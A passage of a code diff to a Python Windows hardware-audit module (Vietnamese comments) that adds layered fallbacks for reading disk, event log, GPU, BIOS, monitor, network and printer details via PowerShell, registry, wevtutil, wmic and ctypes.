+                # Tạo danh sách PhysicalDisks tối thiểu từ logical drives để không bị trống giao diện
+                total_size = sum(d.get("Size", 0) for d in logical_drives)
+                fallback_parts = []
+                for idx, ld in enumerate(logical_drives):
+                    fallback_parts.append({
+                        "DeviceID": f"Disk #0, Partition #{idx}",
+                        "Type": "Basic Data",
+                        "Size": ld.get("Size", 0),
+                        "LogicalDisks": [ld]
+                    })
+                phys_disks = [{
+                    "DeviceID": r"\\.\PHYSICALDRIVE0",
+                    "Model": "Primary System Drive",
+                    "SerialNumber": "N/A",
+                    "InterfaceType": "SATA/NVMe",
+                    "MediaType": "Fixed hard disk media",
+                    "Status": "OK",
+                    "Size": total_size,
+                    "Partitions": fallback_parts
+                }]
+
+            self._details = {
+                "PhysicalDisks": phys_disks,
+                "NetworkDrives": net_drives,
+                "LogicalDisks": logical_drives
+            }
             return self._details
 
-
+    # --- 4. EVENT LOG AUDIT (Đa tầng: Get-WinEvent -> Get-EventLog -> wevtutil) ---
     class _EventLogAudit:
         def __init__(self, max_events: int = 25): 
-            self._details, self.max_events = [], max_events
+            self._details = []
+            self.max_events = max_events
             
         def get_details(self) -> List[Dict[str, Any]]:
-            if self._details: return self._details
+            if self._details:
+                return self._details
             
-            ps_script = f"Get-WinEvent -LogName System -EA SilentlyContinue | Select-Object -First {self.max_events} -Prop TimeCreated,ProviderName,Id,LevelDisplayName,Message,UserId | ConvertTo-Json -Depth 3"
-            
+            # Tầng 1 & 2: Thử Get-WinEvent (Win 8/10/11), nếu lỗi fallback sang Get-EventLog (Win 7)
+            ps_script = f"""
+            $events = @()
+            if (Get-Command Get-WinEvent -ErrorAction SilentlyContinue) {{
+                try {{
+                    $events = Get-WinEvent -LogName System -MaxEvents {self.max_events} -ErrorAction Stop |
+                        Select-Object TimeCreated, ProviderName, Id, LevelDisplayName, Message
+                }} catch {{}}
+            }}
+            if ($events.Count -eq 0 -and (Get-Command Get-EventLog -ErrorAction SilentlyContinue)) {{
+                try {{
+                    $events = Get-EventLog -LogName System -Newest {self.max_events} -ErrorAction Stop |
+                        Select-Object @{{n='TimeCreated';e={{$_.TimeGenerated}}}}, @{{n='ProviderName';e={{$_.Source}}}}, @{{n='Id';e={{$_.EventID}}}}, @{{n='LevelDisplayName';e={{$_.EntryType}}}}, Message
+                }} catch {{}}
+            }}
+            $events | ConvertTo-Json -Depth 2
+            """
             try:
                 raw_events = _run_powershell(ps_script)
-                processed_events = []
-                
                 if isinstance(raw_events, dict):
                     raw_events = [raw_events]
-
-                for event in raw_events:
-                    if event is None:
-                        continue
-                        
+                
+                processed_events = []
+                for event in (raw_events or []):
+                    if not event or not isinstance(event, dict): continue
                     dt_obj = _parse_dotnet_json_date(event.get("TimeCreated"))
-                    event["TimeCreated"] = dt_obj.strftime("%Y-%m-%d %H:%M:%S") if dt_obj else None
-                    
-                    user_id_obj = event.get("UserId")
-                    event["UserSid"] = user_id_obj.get("Value") if isinstance(user_id_obj, dict) else None
-                    if "UserId" in event: 
-                        del event["UserId"]
-                    
-                    if "Message" in event and event.get("Message"): 
-                        event["Message"] = event["Message"].replace('\r\n', ' ').strip()
-                    
+                    event["TimeCreated"] = dt_obj.strftime("%Y-%m-%d %H:%M:%S") if dt_obj else str(event.get("TimeCreated") or '')
+                    if "Message" in event and event.get("Message"):
+                        event["Message"] = str(event["Message"]).replace('\r\n', ' ').strip()
                     processed_events.append(event)
-
-                self._details = processed_events
-            except Exception as e: 
-                self._details = [{"Error": f"Could not retrieve 'System' event log: {e}"}]
-            return self._details
-
-    class _GpuAudit:
-        def __init__(self): self._details: List[Dict[str, Any]] = []
-        def get_details(self) -> List[Dict[str, Any]]:
-            if self._details: return self._details
-            props = "Name,AdapterRAM,DriverVersion,DriverDate,Status,VideoProcessor,VideoModeDescription"
-            ps_script = f"Get-CimInstance Win32_VideoController | Select-Object {props} | ConvertTo-Json -Depth 2"
-            try:
-                raw_data = _run_powershell(ps_script)
-                raw_data = [raw_data] if isinstance(raw_data, dict) else (raw_data or [])
-                if not raw_data: self._details = [{"Info": "No GPU found"}]; return self._details
                 
-                processed_gpus = []
-                for gpu in raw_data:
-                    dt = _parse_dotnet_json_date(gpu.get("DriverDate"))
-                    try: vram = int(gpu.get("AdapterRAM") or 0)
-                    except (ValueError, TypeError): vram = None
-                    processed_gpus.append({
-                        "Name": gpu.get("Name"), "VRAM_Bytes": vram,
-                        "DriverVersion": gpu.get("DriverVersion"),
-                        "DriverDate": dt.strftime("%Y-%m-%d") if dt else None,
-                        "Status": gpu.get("Status"),
-                    })
-                self._details = processed_gpus
-            except Exception as e: self._details = [{"Error": f"Could not get GPU info: {e}"}]
-            return self._details
+                if processed_events:
+                    self._details = processed_events
+                    return self._details
+            except Exception:
+                pass
 
-    class _MainboardAudit:
-        def __init__(self): self._details: Dict[str, Any] = {}
-        def _wmic_query(self, cls: str, fields: str) -> Dict[str, Any]:
-            si=subprocess.STARTUPINFO(); si.dwFlags|=subprocess.STARTF_USESHOWWINDOW; cf=subprocess.CREATE_NO_WINDOW
+            # Tầng 3: CLI native wevtutil (Có sẵn trên tất cả các bản Windows từ Win 7 đến Win 11)
             try:
-                res = subprocess.check_output(f"wmic {cls} get {fields} /format:list", shell=True, text=True, stderr=subprocess.DEVNULL, startupinfo=si, creationflags=cf)
-                return {k.strip(): v.strip() for k, v in (line.split("=", 1) for line in res.strip().splitlines() if "=" in line)}
-            except Exception as e: return {f"{cls} Error": str(e)}
-        def get_details(self) -> Dict[str, Any]:
-            if self._details: return self._details
-            bb_info = self._wmic_query("baseboard", "Manufacturer,Product,Model,SerialNumber,Version")
-            bios_info = self._wmic_query("bios", "Manufacturer,SMBIOSBIOSVersion,ReleaseDate,Version,SerialNumber")
-            self._details = {
-                "BaseBoard": {"Manufacturer": bb_info.get("Manufacturer"), "Product": bb_info.get("Product"), "Model": bb_info.get("Model") or bb_info.get("Product"), "SerialNumber": bb_info.get("SerialNumber"), "Version": bb_info.get("Version")},
-                "BIOS": {"Manufacturer": bios_info.get("Manufacturer"), "Version": bios_info.get("SMBIOSBIOSVersion") or bios_info.get("Version"), "ReleaseDate": bios_info.get("ReleaseDate"), "SerialNumber": bios_info.get("SerialNumber")}
-            }
-            return self._details
-
-    class _MonitorAudit:
-        def __init__(self): self._details: List[Dict[str, Any]] = []
-        def get_details(self) -> List[Dict[str, Any]]:
-            if self._details: return self._details
-            ps_script = r"""
-            try {
-                Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
-                $screens = [System.Windows.Forms.Screen]::AllScreens
-            } catch {
-                $screens = @()
-            }
-
-            try {
-                $wmi_monitors = Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorID -ErrorAction SilentlyContinue
-            } catch {
-                $wmi_monitors = @()
-            }
-
-            $results = @()
-
-            if ($wmi_monitors) {
-                for ($i = 0; $i -lt $wmi_monitors.Count; $i++) {
-                    $id = $wmi_monitors[$i]
-                    
-                    $name_bytes = $id.UserFriendlyName | Where-Object { $_ -ne 0 }
-                    $name = if ($name_bytes) { [System.Text.Encoding]::ASCII.GetString($name_bytes).Trim() } else { "" }
-                    if (!$name) {
-                        $prod_bytes = $id.ProductCodeID | Where-Object { $_ -ne 0 }
-                        $name = if ($prod_bytes) { [System.Text.Encoding]::ASCII.GetString($prod_bytes).Trim() } else { "Generic Monitor" }
-                    }
-                    
-                    $manu_bytes = $id.ManufacturerName | Where-Object { $_ -ne 0 }
-                    $manu = if ($manu_bytes) { [System.Text.Encoding]::ASCII.GetString($manu_bytes).Trim() } else { "Unknown" }
-                    
-                    $serial_bytes = $id.SerialNumberID | Where-Object { $_ -ne 0 }
-                    $serial = if ($serial_bytes) { [System.Text.Encoding]::ASCII.GetString($serial_bytes).Trim() } else { "N/A" }
-
-                    $conn = Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorConnectionParams -ErrorAction SilentlyContinue | Where-Object { $_.InstanceName -eq $id.InstanceName }
-                    $conn_type = "Unknown"
-                    if ($conn) {
-                        $types = @{
-                            0 = "VGA"; 1 = "DVI-D"; 2 = "DVI-I"; 3 = "Composite"; 4 = "S-Video";
-                            5 = "Component"; 6 = "Notebook Internal"; 7 = "SDI"; 8 = "FireWire";
-                            9 = "HDMI"; 10 = "LVDS"; 11 = "DisplayPort"; 255 = "Unknown"
-                        }
-                        $vstd = $conn.VideoStandard
-                        $conn_type = if ($types.ContainsKey($vstd)) { $types[$vstd] } else { "Digital ($vstd)" }
-                    }
-
-                    $resolution = "Unknown"
-                    $is_primary = $false
-                    if ($i -lt $screens.Count) {
-                        $screen = $screens[$i]
-                        $resolution = "$($screen.Bounds.Width) x $($screen.Bounds.Height)"
-                        $is_primary = $screen.Primary
-                    }
-
-                    $results += [PSCustomObject]@{
-                        Name = $name
-                        Manufacturer = $manu
-                        SerialNumber = $serial
-                        ConnectionType = $conn_type
-                        Resolution = $resolution
-                        IsPrimary = $is_primary
-                    }
-                }
-            }
-
-            if ($results.Count -eq 0 -and $screens) {
-                foreach ($screen in $screens) {
-                    $dev_name = $screen.DeviceName
-                    $wmi_desktop = Get-CimInstance Win32_DesktopMonitor -ErrorAction SilentlyContinue | Where-Object { $_.DeviceID -eq $dev_name -or $_.Name -like "*$dev_name*" }
-                    
-                    $name = if ($wmi_desktop) { $wmi_desktop.Name } else { "Generic Monitor" }
-                    $manu = if ($wmi_desktop) { $wmi_desktop.MonitorManufacturer } else { "Unknown" }
-                    $type = if ($wmi_desktop) { $wmi_desktop.MonitorType } else { "Virtual Display" }
-
-                    $results += [PSCustomObject]@{
-                        Name = $name
-                        Manufacturer = $manu
-                        SerialNumber = "N/A"
-                        ConnectionType = $type
-                        Resolution = "$($screen.Bounds.Width) x $($screen.Bounds.Height)"
-                        IsPrimary = $screen.Primary
-                    }
-                }
-            }
-
-            if ($results.Count -eq 0) {
-                $video = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
-                $desktop_monitors = Get-CimInstance Win32_DesktopMonitor -ErrorAction SilentlyContinue
-                
-                if ($desktop_monitors) {
-                    foreach ($mon in $desktop_monitors) {
-                        $resolution = "Unknown"
-                        if ($video) {
-                            $resolution = "$($video.CurrentHorizontalResolution) x $($video.CurrentVerticalResolution)"
-                        }
-                        $results += [PSCustomObject]@{
-                            Name = $mon.Name
-                            Manufacturer = $mon.MonitorManufacturer
-                            SerialNumber = "N/A"
-                            ConnectionType = $mon.MonitorType
-                            Resolution = $resolution
-                            IsPrimary = $true
-                        }
-                    }
-                }
-            }
-
-            $results | ConvertTo-Json
-            """
-            try:
-                raw_data = _run_powershell(ps_script)
-                self._details = [raw_data] if isinstance(raw_data, dict) else (raw_data or [])
+                si = subprocess.STARTUPINFO()
+                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                cf = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
+                cmd = f"wevtutil qe System /c:{self.max_events} /rd:true /f:text"
+                output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL, startupinfo=si, creationflags=cf, timeout=10)
+                records = []
+                current = {}
+                for line in output.splitlines():
+                    line = line.strip()
+                    if line.startswith("Event["):
+                        if current: records.append(current)
+                        current = {"ProviderName": "System", "Id": 0, "LevelDisplayName": "Information", "TimeCreated": "", "Message": ""}
+                    elif line.startswith("Date:"): current["TimeCreated"] = line.replace("Date:", "").strip()
+                    elif line.startswith("Event ID:"): current["Id"] = line.replace("Event ID:", "").strip()
+                    elif line.startswith("Source:"): current["ProviderName"] = line.replace("Source:", "").strip()
+                    elif line.startswith("Description:"): current["Message"] = line.replace("Description:", "").strip()
+                if current: records.append(current)
+                self._details = records or [{"Info": "No recent events logged."}]
             except Exception as e:
-                self._details = [{"Error": f"Could not get monitor info: {e}"}]
+                self._details = [{"Error": f"Could not retrieve System event log: {e}"}]
+
             return self._details
 
-    class _NetworkAudit:
-        def __init__(self): self._details: List[Dict[str, Any]] = []
-        def get_details(self) -> List[Dict[str, Any]]:
-            if self._details: return self._details
-            ps_script = """
-            Get-CimInstance Win32_NetworkAdapterConfiguration | ForEach-Object {
-                $c = $_; $a = Get-CimInstance Win32_NetworkAdapter -Filter "PhysicalAdapter = true AND InterfaceIndex = $($c.InterfaceIndex)"
-                if ($a) { [PSCustomObject]@{ Description=$c.Description; MACAddress=$c.MACAddress; IPAddresses=$c.IPAddress;
-                    DefaultGateway=$c.DefaultIPGateway; DNSServers=$c.DNSServerSearchOrder; DHCPEnabled=$c.DHCPEnabled;
-                    NetConnectionID=$a.NetConnectionID; Manufacturer=$a.Manufacturer; Speed=$a.Speed; Status=$a.NetConnectionStatus } }
-            } | ConvertTo-Json -Depth 4
-            """
-            status_map = {0:"Disconnected", 1:"Connecting", 2:"Connected", 3:"Disconnecting", 7:"Media disconnected"}
-            try:
-                raw_data = _run_powershell(ps_script)
-                raw_data = [raw_data] if isinstance(raw_data, dict) else (raw_data or [])
-                for item in raw_data:
-                    item['Status'] = status_map.get(item.get('Status'), f"Unknown ({item.get('Status')})")
-                    item['Speed'] = item.pop('Speed', 0)
-                self._details = raw_data
-            except Exception as e: self._details = [{"Error": f"Could not get network info: {e}"}]
-            return self._details
-
-    class _PrinterAudit:
+    # --- 5. GPU AUDIT (Đa tầng: CIM/WMI -> Registry Display Class -> Generic) ---
+    class _GpuAudit:
         def __init__(self):
             self._details: List[Dict[str, Any]] = []
-
 
         def get_details(self) -> List[Dict[str, Any]]:
             if self._details:
                 return self._details
 
-            if not PYWIN32_AVAILABLE:
-                self._details = [{"Error": "pywin32 not installed. Cannot access printer info."}]
-                return self._details
-
-            default_printer = win32print.GetDefaultPrinter()
-
+            # --- Tầng 1: PowerShell CIM/WMI ---
+            ps_script = _compat_wmi_script(
+                "Get-CimInstance Win32_VideoController | Select-Object Name, AdapterRAM, DriverVersion, DriverDate, Status | ConvertTo-Json -Depth 2",
+                "Get-WmiObject Win32_VideoController | Select-Object Name, AdapterRAM, DriverVersion, DriverDate, Status | ConvertTo-Json -Depth 2"
+            )
             try:
-                printers_raw = win32print.EnumPrinters(
-                    win32print.PRINTER_ENUM_LOCAL | win32print.PRINTER_ENUM_CONNECTIONS,
-                    None,
-                    2
-                )
+                raw_data = _run_powershell(ps_script)
+                raw_data = [raw_data] if isinstance(raw_data, dict) else (raw_data or [])
                 processed = []
-                for p in printers_raw:
-                    status_code = p.get("Status", 0)
-                    attr_code = p.get("Attributes", 0)
-                    
-                    # Việc xác định "Online" sẽ được chuyển sang JS.
-                    # Tuy nhiên, vẫn có thể giữ lại ở đây để tiện cho các mục đích khác.
-                    # 0x80 là cờ OFFLINE.
-                    is_online = (status_code & 0x80) == 0
-
+                for gpu in raw_data:
+                    if not gpu or not isinstance(gpu, dict): continue
+                    dt = _parse_dotnet_json_date(gpu.get("DriverDate"))
+                    try: vram = int(gpu.get("AdapterRAM") or 0)
+                    except Exception: vram = None
                     processed.append({
-                        "Printer Name": p.get("pPrinterName"),
-                        "Default": (p.get("pPrinterName") == default_printer),
-                        "Online": is_online, # Giữ lại trường này cho tiện
-                        "Status": status_code, # Trả về mã số gốc
-                        "Driver Name": p.get("pDriverName"),
-                        "Jobs in Queue": p.get("cJobs", 0),
-                        "Port Name": p.get("pPortName"),
-                        "Attributes": attr_code
+                        "Name": gpu.get("Name") or "Generic Display Adapter",
+                        "VRAM_Bytes": vram,
+                        "DriverVersion": gpu.get("DriverVersion") or "N/A",
+                        "DriverDate": dt.strftime("%Y-%m-%d") if dt else str(gpu.get("DriverDate") or "N/A"),
+                        "Status": gpu.get("Status") or "OK"
                     })
+                if processed:
+                    self._details = processed
+                    return self._details
+            except Exception:
+                pass
 
-                self._details = processed
+            # --- Tầng 2: Đọc Registry Display Class (100% độc lập, không cần PowerShell) ---
+            try:
+                guid_key = r"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}"
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, guid_key) as k:
+                    subkeys = winreg.QueryInfoKey(k)[0]
+                    reg_gpus = []
+                    for i in range(subkeys):
+                        sub = winreg.EnumKey(k, i)
+                        if sub.isdigit():
+                            try:
+                                with winreg.OpenKey(k, sub) as sk:
+                                    def gv(name):
+                                        try: return winreg.QueryValueEx(sk, name)[0]
+                                        except: return None
+                                    desc = gv("DriverDesc")
+                                    if desc:
+                                        ver = gv("DriverVersion") or "N/A"
+                                        date = gv("DriverDate") or "N/A"
+                                        vram = gv("HardwareInformation.qwMemorySize") or 0
+                                        reg_gpus.append({
+                                            "Name": desc,
+                                            "VRAM_Bytes": int(vram) if vram else None,
+                                            "DriverVersion": ver,
+                                            "DriverDate": date,
+                                            "Status": "OK"
+                                        })
+                            except Exception:
+                                pass
+                    if reg_gpus:
+                        self._details = reg_gpus
+                        return self._details
+            except Exception:
+                pass
 
-            except Exception as e:
-                self._details = [{"Error": f"Failed to retrieve printers: {e}"}]
-
+            self._details = [{"Name": "Basic Display Adapter", "VRAM_Bytes": 0, "DriverVersion": "N/A", "DriverDate": "N/A", "Status": "OK"}]
             return self._details
 
+    # --- 6. MAINBOARD & BIOS (Đa tầng: Registry BIOS -> CIM/WMI -> WMIC an toàn) ---
+    class _MainboardAudit:
+        def __init__(self):
+            self._details: Dict[str, Any] = {}
 
+        def get_details(self) -> Dict[str, Any]:
+            if self._details:
+                return self._details
+
+            bb = {"Manufacturer": None, "Product": None, "Model": None, "SerialNumber": None, "Version": None}
+            bios = {"Manufacturer": None, "Version": None, "ReleaseDate": None, "SerialNumber": None}
+
+            # --- Tầng 1: Đọc Registry (Nhanh, tương thích 100% Win 7, 8, 10, 11) ---
+            try:
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS") as key:
+                    def get_val(name):
+                        try:
+                            v, _ = winreg.QueryValueEx(key, name)
+                            s = str(v).strip()
+                            return s if s and s.lower() != "default string" else None
+                        except Exception:
+                            return None
+
+                    bb["Manufacturer"] = get_val("BaseBoardManufacturer") or get_val("SystemManufacturer")
+                    bb["Product"] = get_val("BaseBoardProduct") or get_val("SystemProductName")
+                    bb["Model"] = bb["Product"]
+                    bb["SerialNumber"] = get_val("BaseBoardSerialNumber") or get_val("SystemSerialNumber")
+                    bb["Version"] = get_val("BaseBoardVersion") or get_val("SystemVersion")
+
+                    bios["Manufacturer"] = get_val("BIOSVendor")
+                    bios["Version"] = get_val("BIOSVersion")
+                    bios["ReleaseDate"] = get_val("BIOSReleaseDate")
+                    bios["SerialNumber"] = get_val("SystemSerialNumber")
+            except Exception:
+                pass
+
+            # --- Tầng 2: PowerShell CIM / WMI nếu thiếu thông tin ---
+            if not bb["Manufacturer"] or not bios["Manufacturer"]:
+                try:
+                    ps_script = _compat_wmi_script(
+                        """
+                        $b = Get-CimInstance Win32_BaseBoard -EA 0
+                        $bi = Get-CimInstance Win32_BIOS -EA 0
+                        @{ BaseBoard = $b; BIOS = $bi } | ConvertTo-Json
+                        """,
+                        """
+                        $b = Get-WmiObject Win32_BaseBoard -EA 0
+                        $bi = Get-WmiObject Win32_BIOS -EA 0
+                        @{ BaseBoard = $b; BIOS = $bi } | ConvertTo-Json
+                        """
+                    )
+                    data = _run_powershell(ps_script)
+                    if isinstance(data, dict):
+                        b_data = data.get("BaseBoard") or {}
+                        bi_data = data.get("BIOS") or {}
+                        if not bb["Manufacturer"] and b_data.get("Manufacturer"): bb["Manufacturer"] = b_data["Manufacturer"]
+                        if not bb["Product"] and b_data.get("Product"):
+                            bb["Product"] = b_data["Product"]
+                            bb["Model"] = b_data["Product"]
+                        if not bb["SerialNumber"] and b_data.get("SerialNumber"): bb["SerialNumber"] = b_data["SerialNumber"]
+                        if not bb["Version"] and b_data.get("Version"): bb["Version"] = b_data["Version"]
+                        if not bios["Manufacturer"] and bi_data.get("Manufacturer"): bios["Manufacturer"] = bi_data["Manufacturer"]
+                        if not bios["Version"] and (bi_data.get("SMBIOSBIOSVersion") or bi_data.get("Version")):
+                            bios["Version"] = bi_data.get("SMBIOSBIOSVersion") or bi_data.get("Version")
+                        if not bios["ReleaseDate"] and bi_data.get("ReleaseDate"): bios["ReleaseDate"] = str(bi_data.get("ReleaseDate"))
+                        if not bios["SerialNumber"] and bi_data.get("SerialNumber"): bios["SerialNumber"] = bi_data.get("SerialNumber")
+                except Exception:
+                    pass
+
+            # --- Tầng 3: WMIC (Chỉ chạy nếu có wmic.exe, tránh lỗi trên Win 11) ---
+            if not bb["Manufacturer"] or not bios["Manufacturer"]:
+                try:
+                    si = subprocess.STARTUPINFO()
+                    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                    cf = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
+                    out = subprocess.check_output("wmic baseboard get Manufacturer,Product,SerialNumber,Version /format:list",
+                                                 shell=True, text=True, stderr=subprocess.DEVNULL, startupinfo=si, creationflags=cf, timeout=3)
+                    for line in out.strip().splitlines():
+                        if "=" in line:
+                            k, v = line.split("=", 1)
+                            k, v = k.strip(), v.strip()
+                            if k in bb and not bb[k]: bb[k] = v
+                    if bb.get("Product") and not bb.get("Model"): bb["Model"] = bb["Product"]
+                except Exception:
+                    pass
+
+            # Điền fallback nếu vẫn trống
+            if not bb["Manufacturer"]: bb["Manufacturer"] = "Generic Motherboard"
+            if not bb["Product"]: bb["Product"] = "Mainboard"
+            if not bb["Model"]: bb["Model"] = bb["Product"]
+            if not bios["Manufacturer"]: bios["Manufacturer"] = "American Megatrends / Phoenix / Insyde"
+            if not bios["Version"]: bios["Version"] = "N/A"
+
+            self._details = {"BaseBoard": bb, "BIOS": bios}
+            return self._details
+
+    # --- 7. MONITOR AUDIT (Đa tầng: Win32 API ctypes -> Registry DISPLAY -> PowerShell) ---
+    class _MonitorAudit:
+        def __init__(self):
+            self._details: List[Dict[str, Any]] = []
+
+        def get_details(self) -> List[Dict[str, Any]]:
+            if self._details:
+                return self._details
+
+            monitors = []
+
+            # --- Tầng 1: Win32 API qua ctypes (Siêu tốc < 10ms, hỗ trợ cả RDP & Máy ảo) ---
+            if platform.system() == "Windows" and ctypes and wintypes:
+                try:
+                    class DISPLAY_DEVICEW(ctypes.Structure):
+                        _fields_ = [
+                            ('cb', wintypes.DWORD),
+                            ('DeviceName', wintypes.WCHAR * 32),
+                            ('DeviceString', wintypes.WCHAR * 128),
+                            ('StateFlags', wintypes.DWORD),
+                            ('DeviceID', wintypes.WCHAR * 128),
+                            ('DeviceKey', wintypes.WCHAR * 128)
+                        ]
+
+                    class DEVMODEW(ctypes.Structure):
+                        _fields_ = [
+                            ('dmDeviceName', wintypes.WCHAR * 32),
+                            ('dmSpecVersion', wintypes.WORD),
+                            ('dmDriverVersion', wintypes.WORD),
+                            ('dmSize', wintypes.WORD),
+                            ('dmDriverExtra', wintypes.WORD),
+                            ('dmFields', wintypes.DWORD),
+                            ('dmPositionX', wintypes.LONG),
+                            ('dmPositionY', wintypes.LONG),
+                            ('dmDisplayOrientation', wintypes.DWORD),
+                            ('dmDisplayFixedOutput', wintypes.DWORD),
+                            ('dmColor', wintypes.SHORT),
+                            ('dmDuplex', wintypes.SHORT),
+                            ('dmYResolution', wintypes.SHORT),
+                            ('dmTTOption', wintypes.SHORT),
+                            ('dmCollate', wintypes.SHORT),
+                            ('dmFormName', wintypes.WCHAR * 32),
+                            ('dmLogPixels', wintypes.WORD),
+                            ('dmBitsPerPel', wintypes.DWORD),
+                            ('dmPelsWidth', wintypes.DWORD),
+                            ('dmPelsHeight', wintypes.DWORD),
+                            ('dmDisplayFlags', wintypes.DWORD),
+                            ('dmDisplayFrequency', wintypes.DWORD),
+                        ]
+
+                    u32 = ctypes.windll.user32
+                    dev = DISPLAY_DEVICEW()
+                    dev.cb = ctypes.sizeof(DISPLAY_DEVICEW)
+                    i = 0
+                    while u32.EnumDisplayDevicesW(None, i, ctypes.byref(dev), 0):
+                        if dev.StateFlags & 1:  # DISPLAY_DEVICE_ATTACHED_TO_DESKTOP
+                            mon_dev = DISPLAY_DEVICEW()
+                            mon_dev.cb = ctypes.sizeof(DISPLAY_DEVICEW)
+                            mon_name = "Generic PnP Monitor"
+                            if u32.EnumDisplayDevicesW(dev.DeviceName, 0, ctypes.byref(mon_dev), 0):
+                                mon_name = mon_dev.DeviceString or mon_dev.DeviceName or "Generic Monitor"
+                            
+                            dm = DEVMODEW()
+                            dm.dmSize = ctypes.sizeof(DEVMODEW)
+                            res = "Unknown"
+                            if u32.EnumDisplaySettingsW(dev.DeviceName, -1, ctypes.byref(dm)):
+                                res = f"{dm.dmPelsWidth} x {dm.dmPelsHeight}"
+                            
+                            is_primary = bool(dev.StateFlags & 4)
+                            monitors.append({
+                                "Name": mon_name,
+                                "Manufacturer": "Standard Display",
+                                "SerialNumber": "N/A",
+                                "ConnectionType": "Digital / Internal",
+                                "Resolution": res,
+                                "IsPrimary": is_primary
+                            })
+                        i += 1
+                except Exception:
+                    pass
+
+            if monitors:
+                self._details = monitors
+                return self._details
+
+            # --- Tầng 2: Fallback lấy độ phân giải mặc định qua GetSystemMetrics ---
+            try:
+                w = ctypes.windll.user32.GetSystemMetrics(0)
+                h = ctypes.windll.user32.GetSystemMetrics(1)
+                self._details = [{
+                    "Name": "Primary Display",
+                    "Manufacturer": "Standard Display",
+                    "SerialNumber": "N/A",
+                    "ConnectionType": "Display",
+                    "Resolution": f"{w} x {h}",
+                    "IsPrimary": True
+                }]
+                return self._details
+            except Exception:
+                pass
+
+            self._details = [{"Name": "Generic Monitor", "Manufacturer": "Unknown", "SerialNumber": "N/A", "ConnectionType": "Virtual Display", "Resolution": "1920 x 1080", "IsPrimary": True}]
+            return self._details
+
+    # --- 8. NETWORK AUDIT (Đa tầng: PowerShell CIM/WMI -> psutil native) ---
+    class _NetworkAudit:
+        def __init__(self):
+            self._details: List[Dict[str, Any]] = []
+
+        def get_details(self) -> List[Dict[str, Any]]:
+            if self._details:
+                return self._details
+
+            status_map = {0:"Disconnected", 1:"Connecting", 2:"Connected", 3:"Disconnecting", 7:"Media disconnected"}
+            
+            # --- Tầng 1: PowerShell CIM / WMI ---
+            ps_script = _compat_wmi_script(
+                """
+                Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | ForEach-Object {
+                    $c = $_; $a = Get-CimInstance Win32_NetworkAdapter -Filter "InterfaceIndex = $($c.InterfaceIndex)" -EA SilentlyContinue
+                    [PSCustomObject]@{
+                        Description = $c.Description; MACAddress = $c.MACAddress; IPAddresses = $c.IPAddress;
+                        DefaultGateway = $c.DefaultIPGateway; DNSServers = $c.DNSServerSearchOrder; DHCPEnabled = $c.DHCPEnabled;
+                        NetConnectionID = if ($a) { $a.NetConnectionID } else { $c.Description };
+                        Manufacturer = if ($a) { $a.Manufacturer } else { "Unknown" };
+                        Speed = if ($a) { $a.Speed } else { 0 }; Status = if ($a) { $a.NetConnectionStatus } else { 2 }
+                    }
+                } | ConvertTo-Json -Depth 4
+                """,
+                """
+                Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled = True" | ForEach-Object {
+                    $c = $_; $a = Get-WmiObject Win32_NetworkAdapter -Filter "InterfaceIndex = $($c.InterfaceIndex)" -EA SilentlyContinue
+                    [PSCustomObject]@{
+                        Description = $c.Description; MACAddress = $c.MACAddress; IPAddresses = $c.IPAddress;
+                        DefaultGateway = $c.DefaultIPGateway; DNSServers = $c.DNSServerSearchOrder; DHCPEnabled = $c.DHCPEnabled;
+                        NetConnectionID = if ($a) { $a.NetConnectionID } else { $c.Description };
+                        Manufacturer = if ($a) { $a.Manufacturer } else { "Unknown" };
+                        Speed = if ($a) { $a.Speed } else { 0 }; Status = if ($a) { $a.NetConnectionStatus } else { 2 }
+                    }
+                } | ConvertTo-Json -Depth 4
+                """
+            )
+            try:
+                raw_data = _run_powershell(ps_script)
+                raw_data = [raw_data] if isinstance(raw_data, dict) else (raw_data or [])
+                processed = []
+                for item in raw_data:
+                    if not item or not isinstance(item, dict): continue
+                    item['Status'] = status_map.get(item.get('Status'), "Connected")
+                    item['Speed'] = item.get('Speed', 0) or 0
+                    processed.append(item)
+                if processed:
+                    self._details = processed
+                    return self._details
+            except Exception:
+                pass
+
+            # --- Tầng 2: psutil native ---
+            try:
+                stats = psutil.net_if_stats()
+                addrs = psutil.net_if_addrs()
+                res = []
+                for nic, addr_list in addrs.items():
+                    if "loopback" in nic.lower(): continue
+                    ip_list = [a.address for a in addr_list if a.family == socket.AF_INET]
+                    mac = next((a.address for a in addr_list if a.family == psutil.AF_LINK), "N/A")
+                    st = stats.get(nic)
+                    is_up = st.isup if st else True
+                    speed = (st.speed * 1000000) if st and st.speed else 0
+                    res.append({
+                        "Description": nic,
+                        "MACAddress": mac,
+                        "IPAddresses": ip_list,
+                        "DefaultGateway": [],
+                        "DNSServers": [],
+                        "DHCPEnabled": True,
+                        "NetConnectionID": nic,
+                        "Manufacturer": "Network Adapter",
+                        "Speed": speed,
+                        "Status": "Connected" if is_up else "Disconnected"
+                    })
+                if res:
+                    self._details = res
+                    return self._details
+            except Exception:
+                pass
+
+            self._details = [{"Error": "Could not retrieve network info."}]
+            return self._details
+
+    # --- 9. PRINTER AUDIT (Đa tầng: pywin32 -> CIM/WMI -> Registry Devices) ---
+    class _PrinterAudit:
+        def __init__(self):
+            self._details: List[Dict[str, Any]] = []
+
+        def get_details(self) -> List[Dict[str, Any]]:
+            if self._details:
+                return self._details
+
+            # --- Tầng 1: Sử dụng pywin32 nếu có sẵn ---
+            if PYWIN32_AVAILABLE:
+                try:
+                    default_printer = win32print.GetDefaultPrinter()
+                    printers_raw = win32print.EnumPrinters(
+                        win32print.PRINTER_ENUM_LOCAL | win32print.PRINTER_ENUM_CONNECTIONS,
+                        None, 2
+                    )
+                    processed = []
